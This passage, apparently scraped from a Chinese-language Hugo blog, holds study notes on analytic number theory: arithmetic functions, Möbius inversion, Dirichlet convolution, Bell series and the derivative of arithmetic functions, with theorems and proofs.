$$ \\begin{align*} 我们有(ff^{-1}\u0026amp;=I) \\newline 那么 \\newline \\sum_{d|n}f^{-1}(d)f(\\dfrac{n}{d})\u0026amp;=0 \\quad (n\u0026gt;1) \\newline \\sum_{d|n}\\mu(d)f(d)f(\\dfrac{n}{d})\u0026amp;=0 \\newline 取n=p^\\alpha,有 \\newline \\mu(1)f(1)f(p^\\alpha)+\\mu(p)f(p)f(p^{\\alpha-1})+0\u0026amp;=0 \\newline f(p^\\alpha)+(-1)f(p)f(p^{\\alpha-1})\u0026amp;=0 \\newline f(p^\\alpha)\u0026amp;=f(p)f(p^{\\alpha-1}) \\end{align} $$ 从$\\alpha\\ge2$开始递推，$f(p^2)=f(p)f(p),f(p^3)=f(p)f(p^2)=f(p)^3$，所以我们证明出对所有素数$p$有$f(p^\\alpha)=f(p)^\\alpha$，即$f$是完全积性的。\nTh7：如果$f$是积性的，那么有：$\\sum\\limits_{d|n}\\mu(d)f(d)=\\prod\\limits_{p|n}(1-f(p))$\nProof：\n令$g(n)=\\sum\\limits_{d|n}\\mu(d)f(d)$，$g$是积性的，利用算术基本定理，我们只需要计算$g(p^\\alpha)$即可。 $$ \\begin{align*} g(p^\\alpha)\u0026amp;=\\sum_{d|p^\\alpha}\\mu(d)f(d) \\newline \u0026amp;=\\mu(1)f(1)+\\mu(p)f(p)+0+\\cdots+0 \\newline \u0026amp;=f(1)-f(p) \\newline \u0026amp;=1-f(p) \\end{align*} $$ 所以对于由若干素数幂乘积组成的$n$，我们有 $$ g(n)=g(p_1^{\\alpha1}p_2^{\\alpha2}\\cdots p_r^{\\alpha r})=(1-f(p_1))(1-f(p_2))\\cdots(1-f(p_r))=\\prod_{p|n}(1-f(p)) $$\nChapter2 广义卷积 Definition：$F$表示一个定义在正实轴$(0,\\infty)$上的实数函数，对$0\u0026lt;x\u0026lt;1$,有$F(x)=0$。我们定义出一个新函数$G$,表示为 $$ G = \\sum_{n\\le{x}}\\alpha(n)F(\\dfrac{x}{n}) $$ 其中，$\\alpha$是任意数论函数。对于$0\u0026lt;x\u0026lt;1$,也有$G(x)=0$。$\\alpha,F,G$的关系可以表示为： $$ (\\alpha\\circ F)(x) = \\sum_{n\\le{x}}\\alpha(x)F(\\dfrac{x}{n}) $$\nTheorem:\nTh1：关于$\\circ$和$*$的结合性，单独的运算$\\circ$是可交换但是不可以结合的，配合狄利克雷乘积和任意数论函数$\\alpha$和$\\beta$我们有 $$ \\alpha \\circ (\\beta \\circ F) = (\\alpha * \\beta)\\circ F $$ Proof：\n对于$x\u0026gt;0$有： $$ \\begin{align*} {\\alpha \\circ (\\beta \\circ F)}(x)\u0026amp;=\\sum_{n\\le x}\\alpha(n)\\sum_{m\\le\\dfrac{x}{n}}\\beta(m)F(\\dfrac{x}{mn}) \\newline \u0026amp;=\\sum_{mn\\le x}\\alpha(n)\\beta(m)F(\\dfrac{x}{mn}) \\newline \u0026amp;=\\sum_{k\\le x}(\\sum_{n|k}\\alpha(n)\\beta(\\dfrac{k}{n}))F(\\dfrac{x}{k}) \\newline \u0026amp;=\\sum_{k\\le x}(\\alpha*\\beta)(k)F(\\dfrac{x}{k}) \\newline \u0026amp;={(\\alpha*\\beta)\\circ F}(x) \\end{align*} $$\nTh2：（广义反转公式）如果$\\alpha$有一个狄利克雷逆函数$\\alpha^{-1}$，那么有： $$ G(x) = \\sum_{n\\le{x}}\\alpha(n)F(\\dfrac{x}{n}) \\newline \\Updownarrow \\newline\nF(x) = \\sum_{n\\le{x}}\\alpha^{-1}(n)G(\\dfrac{x}{n}) $$\nProof：\n已知$G= \\sum_{n\\le{x}}\\alpha(n)F(\\dfrac{x}{n})=\\alpha \\circ F \\newline $， $$ \\alpha^{-1}\\circ G=\\alpha^{-1}\\circ(\\alpha \\circ F)=(\\alpha^{-1}\\alpha)\\circ F=I\\circ F=F \\newline F=\\alpha^{-1}\\circ G= \\sum_{n\\le{x}}\\alpha^{-1}(n)G(\\dfrac{x}{n}) $$ 已知$F= \\sum_{n\\le{x}}\\alpha^{-1}(n)G(\\dfrac{x}{n})=\\alpha^{-1}\\circ G$， $$ \\alpha \\circ F=\\alpha \\circ(\\alpha^{-1}\\circ G)=(\\alpha^{-1}\\alpha)\\circ G=I \\circ G = G \\newline G = \\alpha \\circ F = \\sum_{n\\le{x}}\\alpha(n)F(\\dfrac{x}{n}) $$\nTh3：（广义莫比乌斯反转）如果$\\alpha$是完全积性的，那么有： $$ G(x) = \\sum_{n\\le{x}}\\alpha(n)F(\\dfrac{x}{n}) \\newline \\Updownarrow \\newline\nF(x) = \\sum_{n\\le{x}}\\mu(n)\\alpha(n)G(\\dfrac{x}{n}) $$\nProof：\n令$\\alpha^{-1}=\\alpha\\mu$。\nChapter3 形式幂级数和数论函数的贝尔级数 Section1 形式幂级数 Definition：\n我们知道，在微积分中，x的幂级数形如： $$ \\sum_{n=0}^{\\infty}a(n)x^n = a(0)+a(1)x+a(2)x^2+a(3)x^3+\\cdots+a(n)x^n+\\cdots $$ 这样一个幂级数拥有收敛半径，在范围内会收敛或是发散。\n而从另一个角度来说，我们使用幂级数的写作形式，但不关心x的值，不关心收敛或发散的问题，而是关心幂级数的系数序列$(a(0),a(1),a(2),\\cdots,a(n),\\cdots)$。这些系数序列可以由幂级数中$x^n$的$n$来定位。\n形式幂级数就是通过这样一种角度来理解幂级数，把幂级数看作收敛的并在其上规定代数运算。\nTheorem:\n现在我们有两个形式幂级数，分别是$A(x)$和$B(x)$： $$ A(x) = \\sum_{n=0}^{\\infty}a(n)x^n \\newline B(x)=\\sum_{n=0}^{\\infty}b(n)x^n $$\nTh1：规定相等$A(x) = B(x)$，即$a(n)=b(n),n\\ge0$\nTh2：规定和$A(x)+B(x)=\\sum\\limits_{n=0}^{\\infty}(a(n)+b(n))x^n$\nTh3：规定乘积$A(x)B(x)=\\sum\\limits_{n=0}^{\\infty}c(n)x^n$，其中$c(n) = \\sum\\limits_{k=0}^{\\infty}a(k)b(n-k)$。序列${c(n)}$被称为序列${a(n)}$和${b(n)}$的柯西乘积。\nSection2 贝尔级数 Definition：给定一个数论函数$f$和一个素数$p$，我们规定形式幂级数 $$ f_p(x)=\\sum\\limits_{n=0}^{\\infty}f(p^n)x^n $$ 是$f$关于模$p$的贝尔级数。\nExamples：\n莫比乌斯函数$\\mu()$的贝尔级数：\n由莫比乌斯函数的定义我们可知：$\\mu(p)=-1$，对所有的$n\\ge2,\\mu(p^n)=0$。 $$ \\begin{align*} \\mu_p(x)\u0026amp;=\\sum\\limits_{n=0}^{\\infty}\\mu(p^n)x^n \\newline \u0026amp;=\\mu(p^0)x^0+\\mu(p^1)x^1+\\cdots+\\mu(p^r)x^r+\\cdots \\newline \u0026amp;=\\mu(1)+\\mu(p)x+0 \\newline \u0026amp;=1-x \\end{align*} $$\n欧拉函数$\\varphi()$的贝尔级数：\n由欧拉函数的性质我们可知：$\\varphi(p^n)=p^n-p^{n-1}$。 $$ \\begin{align*} \\varphi_p(x)\u0026amp;=\\sum\\limits_{n=0}^{\\infty}\\varphi(p^n)x^n \\newline \u0026amp;=\\varphi(p^0)x^0+\\varphi(p^1)x^1+\\cdots+\\varphi(p^r)x^r+\\cdots \\newline \u0026amp;=\\varphi(1)+\\sum\\limits_{n=1}^{\\infty}\\varphi(p^n)x^n \\newline \u0026amp;=\\varphi(1)+\\sum\\limits_{n=1}^{\\infty}(p^n-p^{n-1})x^n \\newline \u0026amp;=\\varphi(1)+\\sum\\limits_{n=1}^{\\infty}p^nx^n-\\sum\\limits_{n=1}^{\\infty}p^{n-1}x^n \\newline \u0026amp;=\\sum\\limits_{n=0}^{\\infty}p^nx^n-x\\sum\\limits_{n=0}^{\\infty}p^nx^n \\newline \u0026amp;=(1-x)\\sum\\limits_{n=0}^{\\infty}p^nx^n \\newline \u0026amp;=\\dfrac{1-x}{1-px} \\end{align*} $$\n如果$f$是完全积性的，那么对所有的$n\\ge0$，都有$f(p^n)=f(p)^n$，所以其贝尔级数是几何级数： $$ f_p(x)=\\sum\\limits_{n=0}^{\\infty}f(p)^nx^n=\\dfrac{1}{1-f(p)x} $$\n对于恒等函数$I$,单位函数$u$，幂函数$N^\\alpha$，刘维尔函数$\\lambda$这些完全积性函数来说： $$ I_p(x)=1 \\newline u_p(x)=\\dfrac{1}{1-x} \\newline N_p^\\alpha(x)=\\dfrac{1}{1-p^\\alpha x} \\newline \\lambda_p(x)=\\dfrac{1}{1-(-x)} $$\nTheorem：\nTh1：令$f$和$g$是积性函数，则$f=g \\Leftrightarrow f_p(x)=g_p(x)$对所有的素数$p$\nProof：\n证明$\\Rightarrow$：我们想要证明贝尔级数$f_p(x)=g_p(x)$，在形式幂级数中我们知道，两个形式幂级数$A(x)，B(x)$相等也就是$a(n)=b(n),n\\ge0$。在此处也就是$f(p^n)=g(p^n)$。而$f=g$正好使得$f(p^n)=g(p^n)$。\n证明$\\Leftarrow$：如果贝尔级数$f_p(x)=g_p(x)$，那也就是说$f(p^n)=g(p^n)$。而$f$和$g$都是积性的，同时对所有素数$p$都有相等，配合算术基本定理，得出结论$f=g$。\nTh2：任意两个数论函数$f$和$g$，令$h=f*g$，则对任意的素数$p$，我们有 $$ h_p(x)=f_p(x)g_p(x) $$\nProof：\n对于$p^n$，他的因子只能有$1,p,p^2,\\cdots,p^n$，所以对于狄利克雷卷积我们有： $$ h(p^n)=\\sum\\limits_{d|p^n}f(d)g(\\dfrac{p^n}{d})=\\sum_{k=0}f(p^k)g(p^n-k) $$ 这是柯西乘积的形式，符合形式幂级数乘积的运算规则，所以证明 $$ h_p(x)=f_p(x)g_p(x) $$\nNode：\n当$f$是积性函数时，贝尔级数特别有用。\n等比数列求和公式： $$ S_n = \\dfrac{a_nq-a_1}{q-1} = \\dfrac{a_1(1-q^n)}{1-q} \\newline S_\\infty= \\dfrac{a_1}{1-q}\\quad(|q|\u0026lt;1,n\\rightarrow\\infty) $$\nChapter4 数论函数的导数 Definition：对任一数论函数$f$我们定义它的导数$f^{\u0026rsquo;}$由下面给出： $$ f\u0026rsquo;(n)=f(n)log{n} \\quad对n\\ge1 $$\nExamples:\n对所有的$n,I(n)logn=0$，所以有$I\u0026rsquo;=0$.\n塞尔伯格等式：$n\\ge1$，我们有： $$ \\Lambda(n)logn+\\sum_{d|n}\\Lambda(d)\\Lambda(\\dfrac{n}{d})=\\sum_{d|n}\\mu(d)log^2\\dfrac{n}{d} $$\n首先有$\\Lambdau=u\u0026rsquo;$,对其求导有 $$ \\Lambda\u0026rsquo;u+\\Lambdau\u0026rsquo;=u\u0026rsquo;\u0026rsquo; \\newline \\Lambda\u0026rsquo;u+\\Lambda(\\Lambdau)=u\u0026rsquo;' $$ 用$\\mu=u^{-1}$去乘 $$ \\Lambda\u0026rsquo;uu^{-1}+\\Lambda*(\\Lambda*u)u^{-1}=u\u0026rsquo;\u0026rsquo;u^{-1} \\newline \\Lambda\u0026rsquo;+\\Lambda\\Lambda=u\u0026rsquo;\u0026rsquo;\\mu \\newline \\Lambda(n)logn+\\sum_{d|n}\\Lambda(d)\\Lambda(\\dfrac{n}{d})=\\sum_{d|n}\\mu(d)log^2\\dfrac{n}{d} $$\nTheorem:\nTh1:如果$f$和$g$是数论函数，我们有： $(f+g)\u0026rsquo;=f\u0026rsquo;+g'$ $(f*g)\u0026rsquo;=f\u0026rsquo;g+fg'$ $(f^{-1})\u0026rsquo;=-f\u0026rsquo;(ff)^{-1}$ Proof:\n1.1：对所有的n，有$(f+g)(n)=f(n)+g(n)$\n1.2： $$ \\begin{align*} (fg)\u0026rsquo;\u0026amp;=(\\sum_{d|n}f(d)g(\\dfrac{n}{d}))\u0026rsquo; \\newline \u0026amp;=\\sum_{d|n}f(d)g(\\dfrac{n}{d})log(n) \\newline (logn= \\newline logd+log\\dfrac{n}{d}= \\newline logd+logn-logd) \u0026amp;=\\sum_{d|n}f(d)g(\\dfrac{n}{d})log(d) + \\sum_{d|n}f(d)g(\\dfrac{n}{d})log(\\dfrac{n}{d}) \\newline \u0026amp;=\\sum_{d|n}f(d)log(d)g(\\dfrac{n}{d}) + \\sum_{d|n}f(d)g(\\dfrac{n}{d})log(\\dfrac{n}{d}) \\newline \u0026amp;=\\sum_{d|n}f\u0026rsquo;(d)g(\\dfrac{n}{d}) + \\sum_{d|n}f(d)g\u0026rsquo;(\\dfrac{n}{d}) \\newline \u0026amp;=(f\u0026rsquo;g)+(fg\u0026rsquo;) \\end{align} $$\n1.3：对公式$I\u0026rsquo;=0$使用Th1.2，由$I=f*f^{-1}$,我们有\n$$ \\begin{align*} I\u0026rsquo;\u0026amp;=(ff^{-1})\u0026rsquo; \\newline 0\u0026amp;=(ff^{-1})\u0026rsquo; \\newline \u0026amp;=f\u0026rsquo;f^{-1}+f(f^{-1})\u0026rsquo; \\newline f*(f^{-1})\u0026rsquo;\u0026amp;=-f\u0026rsquo;f^{-1} \\newline f^{-1}f*(f^{-1})\u0026rsquo;\u0026amp;=-f\u0026rsquo;*f^{-1}f^{-1} \\newline (f^{-1})\u0026rsquo;\u0026amp;=-f\u0026rsquo;f^{-1}f^{-1}=-f\u0026rsquo;(ff)^{-1} \\end{align} $$\n","date":"2023-07-24T16:35:00Z","permalink":"https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%87%BD%E6%95%B0%E5%85%B6%E4%BA%8C/","title":"解析数论之数论函数【其二】"},{"content":" 本文使用Typora编写，但Hugo使用KaTex渲染，可能会出现不兼容状态，如需最佳体验请前往这里\n目录 Chapter1 数论函数介绍 Chapter2 数论函数的狄利克雷乘积 Chapter3 莫比乌斯反转 Chapter1 数论函数介绍 在正整数上定义的实数或复数的函数称为数论函数。\nSection1 莫比乌斯函数$\\mu(n)$ Definition： $$ 根据算术基本定理，将大于1的自然数n分解为若干个质数乘积形式\\ n=p_1^{\\alpha_1}p_2^{\\alpha_2} \\cdots p_k^{\\alpha_k}\\ \\mu(n)= \\begin{cases} 1,\u0026amp;\\text{if $n=1$}\\ (-1)^k,\u0026amp;\\text{if ${\\alpha_1}={\\alpha_2}= \\cdots ={\\alpha_k}=1$}\\ 0,\u0026amp;\\text{otherwise} \\end{cases} $$ 对于出现莫比乌斯函数的计算来说，我们更加关注于组成n的若干素数乘积，他们的幂是否都是1。\nExamples:\nn 1 2 3 4 5 6 7 8 9 10 $\\mu(n)$ 1 -1 -1 0 -1 1 -1 0 0 1 Theorem:\nTh1:如果$n\\ge1$，我们有： $$ \\sum_{d|n}\\mu(d)=[\\dfrac{1}{n}]= \\begin{cases} 1,\u0026amp;\\text{if $n=1$}\\ 0,\u0026amp;\\text{if $n\u0026gt;1$} \\end{cases} $$ Proof:\n对于$n=1$，显然成立。\n对于$n\u0026gt;1$，将$n$分解为$n={p_1^{\\alpha_1}}\\cdots{p_k^{\\alpha_k}}$,我们知道${p^{\\alpha}}$的因子只能是$1,p,p^2,\\cdots,p^\\alpha$，而$n$由很多素数幂组成，在此基础上，我们只考虑那些会让$\\mu$不为0的展开项，所以我们展开求和公式： $$ \\begin{align*} \\sum_{d|n}\\mu(d)\u0026amp;=\\mu(1)+\\mu(p_1)+\\cdots+\\mu(p_k)\\ \u0026amp;+\\mu(p_1p_2)+\\cdots+\\mu(p_1p_2p_3)+\\cdots+\\mu(p_1\\cdots p_k)\\ \u0026amp;=1+C_{k}^{1}(-1)+C_{k}^{2}(-1)^{2}+\\cdots+C_{k}^{k}(-1)^k\\ \u0026amp;=(1-1)^k(二项式定理)\\ \u0026amp;=0\\ \\end{align*} $$\nNote:\n二项式定理： $$ (x+y)^n=\\tbinom{n}{0}x^ny^0+\\tbinom{n}{1}x^{n-1}y^1+\\cdots+\\tbinom{n}{n}x^0y^n $$\nSection2 欧拉函数$\\varphi(n)$ Definition：\n欧拉函数$\\varphi(n)$被定义为不大于n并且与n互素的数的个数。\nExamples:\nn 1 2 3 4 5 6 7 8 9 10 $\\varphi(n)$ 1 1 2 2 4 2 6 4 6 4 Theorem:\nTh1：如果$n\\ge1$，我们有： $$ \\sum_{d|n}\\varphi(d)=n $$ Proof：\n用$S$表示不大于$n$的集合${1,2,\\cdots,n}$，接下来将$S$分解为若干个不相交的集合$A$，$A(d)={k|(k,n)=d,1\\le k\\le n}$。集合A里面装的是对于$n$的所有因子，在$S$的范围内与$n$的最大公因数为相同$n$的因子的数放在一起。例如对于$n=10$： $$ S={1,2,3,4,5,6,7,8,9,10}\\ A(1)={1,3,7,9}\\ A(2)={2,4,6,8}\\ A(5)={5}\\ A(10)={10}\\ $$ 现在我们想用一个符号表示$A$中的符号，我们选择$f(d)$来表示$A(d)$中的个数，那么就有： $$ \\sum_{d|n}f(d)=n $$ 现在我们把$(k,n)=d,0 \u0026lt; k \\le n$转化为$(\\dfrac{k}{d},\\dfrac{n}{d})=1,0 \u0026lt; \\dfrac{k}{d} \\le \\dfrac{n}{d}$，如此一来我们就可以找到$A(d)$的数量与$\\varphi(\\dfrac{k}{d})$之间的关系：$f(d)=\\varphi(\\dfrac{n}{d})$，于是 $$ \\sum_{d|n}\\varphi(\\dfrac{n}{d})=n=\\sum_{d|n}\\varphi(d) $$\nTh2：如果$n\\ge1$，我们有： $$ \\varphi(n)=\\sum_{d|n}\\mu(d){\\dfrac{n}{d}} $$ Proof:\n基于欧拉函数的定义我们可以将其改写为： $$ \\varphi(n)=\\sum_{k=1}^{n}[\\dfrac{1}{(n,k)}] $$ 我们使用莫比乌斯函数的定理来改写这个式子： $$ \\varphi(n)=\\sum_{k=1}^{n}[\\dfrac{1}{(n,k)}]=\\sum_{k=1}^{n}\\sum_{d|(n,k)}\\mu(d)=\\sum_{k=1}^{n}\\sum_{d|n\\d|k}\\mu(d) $$ 如何解读上面的求和条件呢？对于n的一个固定的因子d，我们需要满足$k,1\\le k \\le n$是d的倍数求和。所以我们用$k=qd$代替： $$ \\varphi(n)=\\sum_{d|n}\\sum_{q=1}^{\\dfrac{n}{d}}\\mu(d)=\\sum_{d|n}\\mu(d)\\sum_{q=1}^{\\dfrac{n}{d}}1=\\sum_{d|n}\\mu(d)\\dfrac{n}{d} $$\nTh3：如果$n\u0026gt;1$，我们有： $$ \\varphi(n)=n\\prod_{p|n}(1-\\dfrac{1}{p}) $$ Proof:\n对于$n=1$，没有素数整除$1$，这个式子没有意义。\n对于$n\u0026gt;1$，令$p_1,p_2,\\cdots,p_r$为n的不同素因子，那么我们有： $$ \\begin{align*} \\prod_{p|n}(1-\\dfrac{1}{p})\u0026amp;=\\prod_{i=1}^{n}(1-\\dfrac{1}{p_i})\\ \u0026amp;=(1-\\dfrac{1}{p_1})(1-\\dfrac{1}{p_2})\\cdots(1-\\dfrac{1}p_r{})\\ \u0026amp;=1-\\sum\\dfrac{1}{p_i}+\\sum\\dfrac{1}{p_ip_j}-\\sum\\dfrac{1}{p_ip_jp_k}+\\cdots+\\dfrac{(-1)^k}{p_ip_2\\cdots p_k}(这一行的分母可以看作n的因子，分子可以看作\\mu(d)，因为如果出现素数平方幂会等于0)\\ \u0026amp;=\\sum_{d|n}\\dfrac{\\mu(d)}{d} \\end{align*} $$ 所以有 $$ \\varphi(n)=\\sum_{d|n}\\mu(d)\\dfrac{n}{d}=n\\sum_{d|n}\\dfrac{\\mu(d)}{d}=n\\prod_{p|n}(1-\\dfrac{1}{p}) $$\nTh4：欧拉函数有如下性质： 对于素数$P$与$\\alpha\\ge1$,有$\\varphi(P^\\alpha)=p^{\\alpha}-p^{\\alpha-1}$。 $\\varphi(mn)=\\varphi(m)\\varphi(n)(\\dfrac{d}{\\varphi(d)})$，这里$d=(m,n)$。 $\\varphi(mn)=\\varphi(m)\\varphi(n)$，如果$(m,n)=1$。 $a|b$得出$\\varphi(a)|\\varphi(b)$ 当$n\\ge3$时，$\\varphi(n)$是偶数，而且，如果$n$有$r$个不同的奇素因子时，$2^r|\\varphi(n)$。 Proof:\n4.1：在$\\varphi(n)=n\\prod\\limits_{p|n}(1-\\dfrac{1}{p})$中取$n=P^\\alpha$得证。\n4.2：假设有$m,n$两个整数，$mn$积的每一个素因数也是$m$或者$n$的素因数，我们将$p|m,p|n$的素因子$p$遍历出来，会出现重复的因子，为了防止多余计算，我们将多出来的这些出现过的因子除去，于是结合Th3就有了下面的式子： $$ \\dfrac{\\varphi(mn)}{mn}=\\prod_{p|mn}(1-\\dfrac{1}{p})=\\dfrac{\\prod_{p|m}(1-\\dfrac{1}{p})\\prod_{p|n}(1-\\dfrac{1}{p})}{\\prod_{p|(m,n)}(1-\\dfrac{1}{p})}=\\dfrac{\\dfrac{\\varphi(m)}{m} \\dfrac{\\varphi(n)}{n}}{\\dfrac{\\varphi(d)}{d}} $$ 4.3：是4.2的特殊情况\n4.4：由$a|b$我们得出$b=ac,1\\le c \\le b$，如果$c=b$，那么$a=1$，$\\varphi(a)|\\varphi(b)$成立。\n如果$c\u0026lt;b$： $$ \\varphi(b)=\\varphi(ac)=\\varphi(a)\\varphi(c)\\dfrac{d}{\\varphi(d)}=d\\varphi(a)\\dfrac{\\varphi(c)}{\\varphi(d)},d=(a,c) $$ 接下来使用归纳法，假设对所有小于$b$的整数，$\\varphi(a)|\\varphi(b)$成立，那么作为小于$b$的$c$自然满足这一式子，那么既然$d=(a,c),d|c$，于是就有$\\varphi(d)|\\varphi(c)$，于是上面式子的右侧就变成了$\\varphi(a)$的倍数。于是$\\varphi(a)|\\varphi(b)$成立。\n4.5：我们假设$n是偶数，n=2^\\alpha,\\alpha\\ge2$，那么由4.1我们知道$\\varphi(n)$肯定是偶数。如果n至少有一个奇数素因子，我们写： $$ \\varphi(n)=n\\prod_{p|n}\\dfrac{p-1}{p}=\\dfrac{n}{\\prod_{p|n}p}\\prod_{p|n}(p-1)=C(n)\\prod_{p|n}(p-1) $$ 对于上面的式子，$C(n)$是一个整数，而$\\prod_{p|n}(p-1)$是一个偶数（因为有至少一个素因子的贡献），所以$\\varphi(n)$是偶数。\n如果$n$有$r$个不同的奇素因子时，每个素因子都能在上面的式子$\\prod_{p|n}(p-1)$中提供一个因子2，于是就有$2^r|\\varphi(n)$\nSection3 恒等函数$I(n)$、单位函数$u(n)$ Definition： $$ I(n)=[\\dfrac{1}{n}]= \\begin{cases} 1,\u0026amp;\\text{n=1}\\ 0,\u0026amp;\\text{n\u0026gt;1} \\end{cases}\\ u(n)=1 $$\nTheorem:\nTh1：（该定理需要前置知识狄利克雷卷积）对所有的$f$，我们有$If=fI=f$ Proof：\n$$ (f*I)(n)=\\sum_{d|n}f(d)I(\\dfrac{n}{d})=\\sum_{d|n}f(d)[\\dfrac{d}{n}]=f(n) $$\nSection4 Mangoldt(曼戈尔特函数)$\\Lambda(n)$ Definition：对每一个整数$n\\ge1$，我们定义 $$ \\Lambda(n)= \\begin{cases} \\log_{}{p}\u0026amp;如果n=p^m,p为素数，m\\ge1 \\ 0\u0026amp;其他 \\end{cases} $$\nExamples:\nn 1 2 3 4 5 6 7 8 9 10 $\\Lambda(n)$ 0 $\\log{}{2}$ $\\log{}{3}$ $\\log{}{2}$ $\\log{}{5}$ 0 $\\log{}{7}$ $\\log{}{2}$ $\\log{}{3}$ 0 Theorem:\nTh1：若$n\\ge1$，我们有 $$ \\log{}{n}=\\sum_{d|n}\\Lambda(d) $$ Proof:\n$n=1$，两边都是0，成立\n$n\u0026gt;1$，算术基本定理：$n=\\prod\\limits_{k=1}^{r}p_k^{\\alpha_k}$，两边取对数： $$ \\log{n}=\\sum_{k=1}^{r}\\alpha_k\\log{p_k} $$ 现在我们关注要证明的式子的右端$\\log{}{n}=\\sum_{d|n}\\Lambda(d)$,对于$\\Lambda()$来说，非零的项来自$p_k^{m}(m=1,2,\\cdots,\\alpha_k;k=1,2,\\cdots,r)$，于是 $$ \\sum_{d|n}\\Lambda(d)=\\sum_{k=1}^{r}\\sum_{m=1}^{\\alpha_k}\\Lambda(p_k^m)=\\sum_{k=1}^{r}\\sum_{m=1}^{\\alpha_k}\\log{p_k}=\\sum_{k=1}^{r}\\alpha_k\\log{p_k}=\\log{n} $$\nTh2：若$n\\ge1$，我们有 $$ \\Lambda(n)=\\sum_{d|n}\\mu(d)\\log{\\dfrac{n}{d}}=-\\sum_{d|n}\\mu(d)\\log{d} $$ Proof:\n对上面的定理使用莫比乌斯反转： $$ \\log{}{n}=\\sum_{d|n}\\Lambda(d)\\ \\Updownarrow\\ \\Lambda(d)=\\sum_{d|n}\\mu(d)log(\\dfrac{n}{d})=\\log{n}\\sum_{d|n}\\mu(d)-\\sum_{d|n}\\mu(d)\\log{d}=\\log{n}\\cdot I(n)-\\sum_{d|n}\\mu(d)\\log{d} $$ 对于所有的n，$\\log{n}\\cdot I(n)=0$，所以证明完毕。\nSection5 Liouville(刘维尔函数)$\\lambda(n)$ Definition：我们规定$\\lambda(1)=1$，如果$n=p_1^{\\alpha_1}\\cdots p_k^{\\alpha_ k}$，我们规定 $$ \\lambda(n)=(-1)^{\\alpha_1+\\cdots +\\alpha_k} $$\nTheorem:\nTh1：对每一个$n\u0026gt;1$，我们有 $$ \\sum_{d|n}\\lambda(d)= \\begin{cases} 1\u0026amp;\\text{n是平方数}\\ 0\u0026amp;\\text{其他} \\end{cases} $$ Proof:\n令$g(n)=\\sum_{d|n}\\lambda(d)$,$g$是积性的。运用算术基本定理我们只需要确定$g(p^\\alpha)$： $$ \\begin{align*} g(p^\\alpha)\u0026amp;=\\sum_{d|p^\\alpha}\\lambda(d)\\ \u0026amp;=1+\\lambda(p)+\\lambda(p^2)+\\cdots+\\lambda(p^\\alpha)\\ \u0026amp;=1-1+1-\\cdots+(-1)^\\alpha\\ \u0026amp;= \\begin{cases} 1\u0026amp;\\text{$\\alpha$是奇数}\\ 0\u0026amp;\\text{$\\alpha$是偶数} \\end{cases} \\end{align*} $$ 在这种情况下，$n=\\prod\\limits_{k=1}^{r}p_k^{\\alpha_k},g(n)=\\prod\\limits_{k=1}^{r}g(p_k^{\\alpha_k})$，如果有指数$\\alpha$是奇数，那么$g(n)=0$，如果所有的$\\alpha$都是偶数，那么$g(n)=1$。\nSection6 除数函数$\\sigma_{\\alpha}(n)$ Definition：对于实数或复数$\\alpha$以及任意整数$n\u0026gt;1$，我们规定： $$ \\sigma_\\alpha(n)=\\sum_{d|n}d^\\alpha $$ 当$\\alpha=0$时，$\\sigma_{0}(n)$是n的因子个数，常用$d(n)$表示。\n当$\\alpha=1$时，$\\sigma_{1}(n)$是n的因子之和，常用$\\sigma(n)$表示。\nTheorem:\nTh1：对$n\\ge1$，我们有 $$ \\sigma_{\\alpha}^{-1}(n)=\\sum_{d|n}d^{\\alpha}\\mu(d)\\mu(\\dfrac{n}{d}) $$ Proof:\n证明需要狄利克雷卷积相关知识：\n$\\sigma_{\\alpha}(n)=N^\\alpha * u$ $$ \\sigma_{\\alpha}^{-1}(n)=(N^\\alpha * u)^{-1}=(\\mu N^\\alpha)u^{-1}=(\\mu N^\\alpha)\\mu $$\nTh2： $$ \\sigma_{\\alpha}(p^a)= \\begin{cases} a+1\u0026amp;\\text{if $\\alpha=1$},\\ \\dfrac{p^{\\alpha(a+1)}-1}{p^{\\alpha}-1}\u0026amp;\\text{if $\\alpha \\ne 1$} \\end{cases} $$ Proof: $$ \\sigma_{\\alpha}(p^a)=1^\\alpha+p^\\alpha+p^{2\\alpha}+\\cdots+p^{a\\alpha}= \\begin{cases} a+1\u0026amp;\\text{if $\\alpha=1$},\\ \\dfrac{p^{\\alpha(a+1)}-1}{p^{\\alpha}-1}\u0026amp;\\text{if $\\alpha \\ne 1$} \\end{cases} $$\nChapter2 数论函数的狄利克雷乘积 Section1 狄利克雷卷积 **Definition：**如果$f$和$g$是两个数论函数，我们规定他们的狄利克雷卷积由下面的等式确定： $$ h(n)=(f*g)(n)=\\sum_{d|n}f(d)g(\\dfrac{n}{d}) $$ 上面的式子还可以改写成其他形式： $$ h(n)=\\sum_{d|n}f(d)g(\\dfrac{n}{d})=\\sum_{d|n}f(\\frac{n}{d})g(d)=\\sum_{xy=n}f(x)g(y) $$\nExamples：\nEx1：$\\mu*u=I$\nProof： $$ \\mu*u=\\sum_{d|n}\\mu(d)u(\\dfrac{n}{d})=\\sum_{d|n}\\mu(d)=I $$\nEx2：$\\mu*N=\\varphi$\nProof： $$ \\mu*N=\\sum_{d|n}\\mu(d)N(\\dfrac{n}{d})=\\sum_{d|n}\\mu(d)\\dfrac{n}{d}=\\varphi $$\nEx3：$u*N=\\sigma_1$\nProof： $$ u*N=\\sum_{d|n}u(d)N(\\dfrac{n}{d})=\\sum_{d|n}(d)=\\sigma_1 $$\nEx4：$u*u=\\sigma_0$\nProof： $$ u*u=\\sum_{d|n}u(d)u(\\dfrac{n}{d})=\\sum_{d|n}1=\\sigma_0 $$\nEx5：$u*\\varphi=N$\nProof： $$ u*\\varphi=\\sum_{d|n}u(d)\\varphi(\\dfrac{n}{d})=\\sum_{d|n}\\varphi(d)=N $$\nTheorem:\nTh1：狄利克雷卷积满足交换律，即$fg=gf$ Proof:\n$$ \\begin{align*} fg\u0026amp;=\\sum_{xy=n}f(x)g(y)\\ \u0026amp;=\\sum_{xy=n}g(x)f(y)\\ \u0026amp;=fg\\ \\end{align*} $$\nTh2：狄利克雷卷积满足结合律，即$（fg）h=f(gh)$ Proof: $$ \\begin{align*} （fg）h\u0026amp;=\\sum_{xy=n}(fg)(x)h(y)\\ \u0026amp;=\\sum_{xy=n}\\sum_{ab=x}f(a)g(b)h(y)\\ \u0026amp;=\\sum_{abc=n}f(a)g(b)h(c)\\ \u0026amp;=f(gh)(展开过程同上) \\end{align} $$\nTh3：狄利克雷卷积满足分配律，即$f*(g+h)=fg+fh$ Proof: $$ \\begin{align*} 